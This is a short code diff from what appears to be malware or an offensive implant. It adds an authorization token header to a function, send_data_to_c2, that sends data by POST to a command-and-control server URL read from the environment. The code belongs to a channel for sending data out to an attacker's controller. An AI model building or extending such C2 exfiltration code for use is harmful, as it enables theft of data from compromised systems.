@@ -61,7 +61,8 @@ def remove_directory(directory):
 def send_data_to_c2(method, endpoint, data):
     load_dotenv()
     c2_url = str(os.getenv("C2_URL"))
-    headers = {"Content-Type": "application/json"}
+    token = str(os.getenv("TOKEN"))
+    headers = {"Content-Type": "application/json", "authorization": token}
     if method == "POST":
         response = requests.post(
             f"{c2_url}/{endpoint}", data=data, headers=headers)
